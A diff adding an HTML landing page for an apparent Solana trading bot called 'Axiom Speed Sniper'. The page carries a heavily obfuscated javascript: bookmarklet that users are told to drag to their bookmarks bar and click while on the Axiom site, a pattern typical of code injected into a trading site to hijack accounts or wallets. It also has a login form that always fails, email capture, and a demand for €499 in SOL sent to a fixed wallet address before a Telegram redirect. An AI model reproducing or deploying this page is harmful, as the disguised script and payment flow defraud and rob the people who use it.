1%2C%22dJpU%22)%3BC%3Ddocument%5BP(359%2C%22b%5EGb%22)%5D(i%5BP(347%2C%22J%25%25P%22)%5D)%3BC%5BP(826%2C%22TKqY%22)%5D.cssText%3DP(434%2C%22%24%24oI%22)%2CC%5BP(748%2C%22f)Gl%22)%5D%3DP(417%2C%22j2Yl%22)%3Blet%20R%3Ddocument%5BP(649%2C%22Om2j%22)%5D(i.rMASg)%3BR%5BP(547%2C%22iZ4P%22)%5D%5BP(693%2C%227%25UJ%22)%5D%3DP(515%2C%22dJpU%22)%2C%5B%7Baction%3Ai%5BP(365%2C%22Z%40)H%22)%5D%2Camounts%3A%5Bi%5BP(601%2C%22sOWE%22)%5D%2Ci%5BP(764%2C%22n6BJ%22)%5D%2C%221%22%2C%222%22%2C%225%22%5D%2Cunit%3AP(794%2C%22D7BU%22)%2Ccolor%3A%22%2310b981%22%7D%2C%7Baction%3Ai%5BP(342%2C%22uUL4%22)%5D%2Camounts%3A%5B%2210%22%2C%2225%22%2C%2250%22%2Ci%5BP(666%2C%22f)Gl%22)%5D%5D%2Cunit%3A%22%25%22%2Ccolor%3Ai.txEVk%7D%5D%5BP(712%2C%22%26kQm%22)%5D(k%3D%3E%7Blet%20W%3DP%2Cc%3Ddocument%5BW(409%2C%22xq%5DJ%22)%5D(u%5BW(620%2C%22f)Gl%22)%5D)%3Bc%5BW(823%2C%22loo%24%22)%5D%5BW(677%2C%22B4n%5D%22)%5D%3DW(781%2C%22%40%5B%23P%22)%3Bvar%20o%3Ddocument%5BW(735%2C%22n6BJ%22)%5D(W(605%2C%22xq%5DJ%22))%3Bo%5BW(493%2C%22Om2j%22)%5D.cssText%3DW(648%2C%22iZ4P%22)%2Co%5BW(333%2C%22dJpU%22)%5D%3Dk%5BW(768%2C%22J%25%25P%22)%5D%2Cc%5BW(623%2C%22fb%25%23%22)%5D(o)%3Blet%20n%3Ddocument%5BW(572%2C%22J%25%25P%22)%5D(u%5BW(391%2C%22xq%5DJ%22)%5D)%3Bn%5BW(371%2C%22%246NR%22)%5D%5BW(464%2C%22D7BU%22)%5D%3DW(571%2C%22uUL4%22)%2Ck%5BW(789%2C%22!ML*%22)%5D%5BW(775%2C%22uLX%25%22)%5D(c%3D%3E%7Blet%20o%3DW%2Cd%3Ddocument.createElement(o(661%2C%22R3FL%22))%3Bd.style%5Bo(584%2C%22qh5(%22)%5D%3D%22%5Cn%20%20%20%20%20%20%20%20%20%20background%3A%20rgba(255%2C%20255%2C%20255%2C%200.05)%3B%5Cn%20%20%20%20%20%20%20%20%20%20border%3A%201px%20solid%20%22%2Bk.color%2Bo(404%2C%22fb%25%23%22)%2Cd%5Bo(710%2C%22wxRV%22)%5D%3D%22%22%2Bc%2Bk%5Bo(714%2C%22AcqY%22)%5D%2Cd%5Bo(582%2C%2270%5BW%22)%5D%3D()%3D%3E%7Bvar%20W%3Do%3Bd%5BW(577%2C%22uUL4%22)%5D%5BW(379%2C%22f)Gl%22)%5D%3Dk%5BW(348%2C%22%24cY3%22)%5D%2B%2220%22%2Cd%5BW(380%2C%22AcqY%22)%5D%5BW(382%2C%22loo%24%22)%5D%3DW(599%2C%22dEHj%22)%7D%2Cd.onmouseout%3D()%3D%3E%7Bvar%20W%3Do%3Bd.style.background%3DW(377%2C%2270%5BW%22)%2Cd%5BW(450%2C%22%40%5B%23P%22)%5D.boxShadow%3DW(756%2C%22wxRV%22)%7D%2Cd%5Bo(825%2C%22uUL4%22)%5D%3D()%3D%3E%7Bvar%20W%3Do%3Bconsole%5BW(455%2C%22sG42%22)%5D(k.action%2B%22%20%22%2Bc%2Bk.unit%2B%22%20SOL%22)%7D%2Cn%5Bo(527%2C%22nCB%23%22)%5D(d)%7D)%2Cc.appendChild(n)%2CR%5BW(623%2C%22fb%25%23%22)%5D(c)%7D)%2Ca%5BP(533%2C%222%24z5%22)%5D(C)%2Ca%5BP(788%2C%22B4n%5D%22)%5D(R)%2Co.appendChild(W)%2Co%5BP(544%2C%22uLX%25%22)%5D(k)%2Co%5BP(488%2C%22%5Et5J%22)%5D(m)%2Co.appendChild(a)%2Cdocument%5BP(761%2C%22sG42%22)%5D%5BP(481%2C%22%24cY3%22)%5D(o)%2Ci.zhLKF(function(n%2Ck)%7Blet%20t%3DP%2Cm%3D%7Bxcoiv%3Au%5Bt(540%2C%22xhFn%22)%5D%2Cixcbh%3A%22grabbing%22%2CnvGEl%3Au%5Bt(510%2C%222%24z5%22)%5D%2CvXiRG%3Au%5Bt(664%2C%22PRJf%22)%5D%2CfdBVz%3Afunction(W%2Cc)%7Breturn%20u.jPupP(W%2Cc)%7D%2CDodEY%3Au%5Bt(482%2C%22%26kQm%22)%5D%2CdSlfq%3Afunction(W%2Cc)%7Breturn%20W-c%7D%2CLTmji%3Afunction(W%2Cc)%7Bvar%20o%3Dt%3Breturn%20u%5Bo(685%2C%22J%25%25P%22)%5D(W%2Cc)%7D%2CtvuQz%3Afunction(W%2Cc)%7Breturn%20u.Vsyol(W%2Cc)%7D%2COaGiR%3Au.CWnAE%2CWyIGt%3Afunction(W%2Cc)%7Breturn%20u.jPupP(W%2Cc)%7D%2CpKJPv%3A%22touchmove%22%2CGFQdk%3Afunction(W%2Cc)%7Bvar%20o%3Dt%3Breturn%20u%5Bo(660%2C%22J%25%25P%22)%5D(W%2Cc)%7D%2Cciglx%3Afunction(W%2Cc)%7Breturn%20u.Vsyol(W%2Cc)%7D%2CvfEmr%3Afunction(W%2Cc)%7Breturn%20u.UVkky(W%2Cc)%7D%2CQIuow%3Au%5Bt(702%2C%22m3X4%22)%5D%2CrWZge%3A%223%7C1%7C5%7C2%7C0%7C4%22%2CwIIVq%3Au%5Bt(687%2C%22lTF2%22)%5D%7D%2Ce%3D!1%2CC%3D0%2Cr%3D0%2CS%3D0%2Ca%3D0%3Bfunction%20W(W)%7Bvar%20c%3Dt%2Co%3Dm%5Bc(707%2C%22R3FL%22)%5D%5Bc(729%2C%22f%5B*%5D%22)%5D(%22%7C%22)%3Blet%20d%3D0%3Bfor(%3B%3B)%7Bswitch(o%5Bd%2B%2B%5D)%7Bcase%220%22%3Ak%5Bc(463%2C%22X(%24D%22)%5D%5Bc(567%2C%22sOWE%22)%5D%3Dm%5Bc(384%2C%22j2Yl%22)%5D%3Bcontinue%3Bcase%221%22%3Adocument%5Bc(799%2C%22!ML*%22)%5D(m.nvGEl%2Cl)%3Bcontinue%3Bcase%222%22%3AW%5Bc(684%2C%22D7BU%22)%5D()%3Bcontinue%3Bcase%223%22%3Adocument%5Bc(408%2C%22la6h%22)%5D(c(389%2C%22%246NR%22)%2CR%2C%7Bpassive%3A!1%7D)%3Bcontinue%3Bcase%224%22%3Adocument%5Bc(453%2C%22f%5B*%5D%22)%5D(m%5Bc(597%2C%22PRJf%22)%5D%2Cl)%3Bcontinue%3Bcase%225%22%3Aa%3Dm%5Bc(591%2C%22X(%24D%22)%5D(W%5Bc(772%2C%22loo%24%22)%5D%2Cm%5Bc(780%2C%222%24z5%22)%5D)%3F(S%3DW%5Bc(830%2C%22MuR5%22)%5D%5B0%5D.clientX-C%2Cm.dSlfq(W%5Bc(634%2C%220BbE%22)%5D%5B0%5D.clientY%2Cr))%3A(S%3Dm%5Bc(396%2C%22%24%24oI%22)%5D(W%5Bc(369%2C%22AcqY%22)%5D%2CC)%2Cm.tvuQz(W.clientY%2Cr))%3Bcontinue%3Bcase%226%22%3Adocument%5Bc(332%2C%22Om2j%22)%5D(m.OaGiR%2CR)%3Bcontinue%3Bcase%227%22%3Ae%3D!0%3Bcontinue%7Dbreak%7D%7Dfunction%20R(o)%7Bvar%20d%3Dt%3Bif(e)%7Bo.preventDefault()%3Blet%20W%2Cc%3Bc%3Dm.WyIGt(o%5Bd(829%2C%22uUL4%22)%5D%2Cm%5Bd(656%2C%22%40%5B%23P%22)%5D)%3F(W%3Do.touches%5B0%5D.clientX%2Co%5Bd(479%2C%22sOWE%22)%5D%5B0%5D%5Bd(372%2C%222%24z5%22)%5D)%3A(W%3Do.clientX%2Co%5Bd(392%2C%22%5Et5J%22)%5D)%2CC%3DW-S%2Cr%3Dm%5Bd(410%2C%220BbE%22)%5D(c%2Ca)%3Bvar%20o%3Dm%5Bd(662%2C%22sOWE%22)%5D(m.dSlfq(window%5Bd(580%2C%22%246NR%22)%5D%2Cn%5Bd(625%2C%222aZ(%22)%5D)%2C10)%2Ck%3Dm%5Bd(808%2C%22nCB%23%22)%5D(m%5Bd(639%2C%22uLX%25%22)%5D(window.innerHeight%2Cn.offsetHeight)%2C10)%3BC%3DMath%5Bd(758%2C%22qh5(%22)%5D(10%2CMath%5Bd(543%2C%22D7BU%22)%5D(C%2Co))%2Cr%3DMath%5Bd(420%2C%22R3FL%22)%5D(10%2CMath.min(r%2Ck))%2Cn%5Bd(747%2C%22EzXz%22)%5D%5Bd(795%2C%22D7BU%22)%5D%3DC%2B%22px%22%2Cn.style.top%3Dr%2B%22px%22%2Cn%5Bd(422%2C%22Z%40)H%22)%5D%5Bd(613%2C%22gFjn%22)%5D%3Dm%5Bd(754%2C%2270%5BW%22)%5D%2Cn%5Bd(665%2C%22!ML*%22)%5D%5Bd(416%2C%22B4n%5D%22)%5D%3Dm.QIuow%7D%7Dfunction%20l()%7Bvar%20W%3Dt%2Cc%3Dm.rWZge%5BW(674%2C%22gYro%22)%5D(%22%7C%22)%3Blet%20o%3D0%3Bfor(%3B%3B)%7Bswitch(c%5Bo%2B%2B%5D)%7Bcase%220%22%3Adocument%5BW(607%2C%22PRJf%22)%5D(m%5BW(802%2C%22AcqY%22)%5D%2Cl)%3Bcontinue%3Bcase%221%22%3Ak%5BW(759%2C%22dEHj%22)%5D%5BW(452%2C%22sG42%22)%5D%3Dm%5BW(608%2C%22048n%22)%5D%3Bcontinue%3Bcase%222%22%3Adocument%5BW(604%2C%22qh5(%22)%5D(%22touchmove%22%2CR)%3Bcontinue%3Bcase%223%22%3Ae%3D!1%3Bcontinue%3Bcase%224%22%3Adocument%5BW(655%2C%22MuR5%22)%5D(W(776%2C%22Z%40)H%22)%2Cl)%3Bcontinue%3Bcase%225%22%3Adocument%5BW(436%2C%22D7BU%22)%5D(m.OaGiR%2CR)%3Bcontinue%7Dbreak%7D%7Dn%5Bt(665%2C%22!ML*%22)%5D.position%3Du%5Bt(412%2C%22b%5EGb%22)%5D%2Cn%5Bt(442%2C%220BbE%22)%5D%5Bt(338%2C%222aZ(%22)%5D%3Dt(629%2C%22PRJf%22)%2Cn.style%5Bt(367%2C%22P*LE%22)%5D%3Dt(621%2C%22gYro%22)%2Cn%5Bt(770%2C%22gYro%22)%5D%5Bt(532%2C%22AcqY%22)%5D%3Du.oaEkn%2Cn%5Bt(610%2C%22MuR5%22)%5D%5Bt(721%2C%22%246NR%22)%5D%3Du%5Bt(824%2C%2270%5BW%22)%5D%2Ck%5Bt(531%2C%222aZ(%22)%5D(u%5Bt(630%2C%22f)Gl%22)%5D%2CW)%2Ck%5Bt(534%2C%22lTF2%22)%5D(%22touchstart%22%2CW%2C%7Bpassive%3A!1%7D)%2Cwindow%5Bt(686%2C%22%24%24oI%22)%5D(u%5Bt(530%2C%22!ML*%22)%5D%2C()%3D%3E%7Bvar%20W%3Dt%2Cc%3Du%5BW(631%2C%22uUL4%22)%5D(u%5BW(719%2C%22loo%24%22)%5D(window.innerWidth%2Cn%5BW(480%2C%22dEHj%22)%5D)%2C10)%2Co%3Du%5BW(708%2C%22uLX%25%22)%5D(u%5BW(429%2C%227%25UJ%22)%5D(window%5BW(473%2C%22Z%40)H%22)%5D%2Cn%5BW(393%2C%222aZ(%22)%5D)%2C10)%3BC%3DMath%5BW(538%2C%22sG42%22)%5D(10%2CMath%5BW(472%2C%22wxRV%22)%5D(C%2Cc))%2Cr%3DMath%5BW(642%2C%22dJpU%22)%5D(10%2CMath%5BW(753%2C%220BbE%22)%5D(r%2Co))%2Cn%5BW(438%2C%22%24cY3%22)%5D%5BW(555%2C%22m3X4%22)%5D%3DC%2B%22px%22%2Cn%5BW(521%2C%22f)Gl%22)%5D%5BW(494%2C%22loo%24%22)%5D%3Dr%2B%22px%22%2Cn.style.right%3Du%5BW(433%2C%22f)Gl%22)%5D%2Cn%5BW(651%2C%22B4n%5D%22)%5D%5BW(343%2C%22Om2j%22)%5D%3DW(548%2C%22gFjn%22)%7D)%7D%2Co%2CW)%7D%7D)()%3B%7D)()%3B" class="bookmark-button">Axiom Speed Sniper ⚡</a>
+            </div>
+
+            <div class="tutorial-instructions">
+                <h3>Quick Setup Instructions:</h3>
+                <ol>
+                    <li><span class="step-number">1</span>Enable your bookmarks bar (Ctrl+Shift+B on Windows, Cmd+Shift+B on Mac)</li>
+                    <li><span class="step-number">2</span>Drag the "Axiom Speed Sniper ⚡" button above to your bookmarks bar</li>
+                    <li><span class="step-number">3</span>Visit Axiom official website</li>
+                    <li><span class="step-number">4</span>Click your Axiom Speed Sniper bookmark to activate the trading interface</li>
+                    <li><span class="step-number">5</span>Configure your strategies and start automated trading!</li>
+                </ol>
+            </div>
+
+            <div class="tutorial-footer">
+                <button onclick="hideModal('tutorialModal')" class="tutorial-close-btn">Got it, thanks!</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="hideModal('loginModal')">&times;</button>
+            <div class="modal-header">
+                <div class="modal-icon">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <h3>Login to Axiom</h3>
+                <p>Access your trading dashboard</p>
+            </div>
+            <form onsubmit="handleLoginSubmit(event)">
+                <input type="email" id="loginEmail" placeholder="Email address" required>
+                <input type="password" id="loginPassword" placeholder="Password" required>
+                <div id="loginError" class="error-message" style="display: none;">
+                    Aucun compte trouvé
+                </div>
+                <button type="submit" class="modal-btn">Login</button>
+            </form>
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="pricingModal" class="modal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="hideModal('pricingModal')">&times;</button>
+            <div class="modal-header">
+                <div class="modal-icon green">
+                    <i class="fas fa-euro-sign"></i>
+                </div>
+                <h3>Pricing</h3>
+                <p>Professional trading subscription</p>
+            </div>
+            <div class="pricing-card">
+                <div class="price">€499</div>
+                <div class="price-period">per month</div>
+                <div class="special-offer">
+                    <div class="offer-title">🎉 Special Offer</div>
+                    <div class="offer-subtitle">3 days free trial included</div>
+                </div>
+                <ul class="features-list">
+                    <li><span class="check">✓</span> Lightning-fast execution</li>
+                    <li><span class="check">✓</span> Advanced sniping algorithms</li>
+                    <li><span class="check">✓</span> 24/7 monitoring</li>
+                    <li><span class="check">✓</span> Priority support</li>
+                    <li><span class="check">✓</span> Risk management tools</li>
+                </ul>
+            </div>
+            <button onclick="showSubscriptionEmail()" class="modal-btn">Subscribe Now - €499/month</button>
+            <p class="modal-disclaimer">No credit card required for trial. Cancel anytime.</p>
+        </div>
+    </div>
+
+    <div id="subscriptionEmailModal" class="modal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="hideModal('subscriptionEmailModal')">&times;</button>
+            <div class="modal-header">
+                <div class="modal-icon green">
+                    <i class="fas fa-euro-sign"></i>
+                </div>
+                <h3>Monthly Subscription</h3>
+                <p>€499/month - Professional Trading</p>
+            </div>
+            <form onsubmit="handleSubscriptionEmailSubmit(event)">
+                <input type="email" id="subscriptionEmailInput" placeholder="Enter your email address" required>
+                <button type="submit" class="modal-btn green">Continue to Payment</button>
+            </form>
+            <p class="modal-disclaimer">Monthly billing. Cancel anytime.</p>
+        </div>
+    </div>
+
+<div id="paymentModal" class="modal">
+   <div class="modal-content">
+       <button class="modal-close" onclick="hideModal('paymentModal')">&times;</button>
+       
+       <div class="modal-header">
+           <h3>Payment - SOL</h3>
+           <div class="payment-amount">€499</div>
+           <p>Monthly Subscription</p>
+       </div>
+       
+       <div class="qr-section" style="text-align: center; margin: 25px auto;">
+           <img src="https://i.imgur.com/yo8nZ3j.png" alt="QR Code" style="width: 200px; height: 200px; display: block; margin: 0 auto;">
+       </div>
+       
+       <div class="payment-details">
+           <div class="payment-label">Send SOL to:</div>
+           <div class="payment-address">3qekaguW388yYbowAK1RN7qLhCM1E7o7rTtUNRTXaLJQ</div>
+           <div class="payment-amount-sol">Amount: ~1.85 SOL</div>
+       </div>
+       
+       <button onclick="handlePaymentComplete()" class="modal-btn green">
+           Payment Completed - Join Telegram
+       </button>
+   </div>
+</div>
+
+    <script>
+        // Video functionality
+        function playVideo() {
+            const video = document.getElementById('presentationVideo');
+            const overlay = document.getElementById('videoOverlay');
+            
+            overlay.classList.add('hidden');
+            video.play();
+        }
+
+        // Reset video overlay when video ends or is paused
+        document.addEventListener('DOMContentLoaded', function() {
+            const video = document.getElementById('presentationVideo');
+            const overlay = document.getElementById('videoOverlay');
+            
+            if (video && overlay) {
+                video.addEventListener('pause', function() {
+                    if (video.currentTime < video.duration - 0.5) {
+                        overlay.classList.remove('hidden');
+                    }
+                });
+                
+                video.addEventListener('ended', function() {
+                    overlay.classList.remove('hidden');
+                });
+            }
+        });
+
+        // Mobile detection
+        function isMobile() {
+            return window.innerWidth <= 768 || /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // Show/hide modals
+        function showModal(modalType) {
+            let modal;
+            
+            switch(modalType) {
+                case 'emailForm':
+                    modal = document.getElementById('emailModal');
+                    break;
+                case 'pricing':
+                    modal = document.getElementById('pricingModal');
+                    break;
+                case 'login':
+                    modal = document.getElementById('loginModal');
+                    break;
+                default:
+                    return;
+            }
+            
+            if (modal) {
+                modal.style.display = 'flex';
+                document.body.style.overflow = 'hidden';
+            }
+        }
+
+        function hideModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) {
+                modal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            }
+        }
+
+        function showSubscriptionEmail() {
+            hideModal('pricingModal');
+            document.getElementById('subscriptionEmailModal').style.display = 'flex';
+        }
+
+        // Form handlers
+        function handleEmailSubmit(event) {
+            event.preventDefault();
+            const email = document.getElementById('emailInput').value;
+            
+            if (email) {
+                hideModal('emailModal');
+                document.getElementById('tutorialModal').style.display = 'flex';
+            }
+        }
+
+        function handleLoginSubmit(event) {
+            event.preventDefault();
+            document.getElementById('loginError').style.display = 'block';
+        }
+
+        function handleSubscriptionEmailSubmit(event) {
+            event.preventDefault();
+            const email = document.getElementById('subscriptionEmailInput').value;
+            
+            if (email) {
+                hideModal('subscriptionEmailModal');
+                document.getElementById('paymentModal').style.display = 'flex';
+            }
+        }
+
+        function handlePaymentComplete() {
+            window.open('https://t.me/axiomspeedsniper', '_blank');
+        }
+
+        // Mobile detection and UI updates
+        document.addEventListener('DOMContentLoaded', function() {
+            if (isMobile()) {
+                // Hide CTA buttons and show mobile warnings
+                document.getElementById('ctaSection').style.display = 'none';
+                document.getElementById('mobileWarning').style.display = 'block';
+                document.getElementById('finalCtaButtons').style.display = 'none';
+                document.getElementById('finalMobileWarning').style.display = 'block';
+            }
+            
+            // Close modals when clicking outside
+            document.addEventListener('click', function(event) {
+                if (event.target.classList.contains('modal')) {
+                    event.target.style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
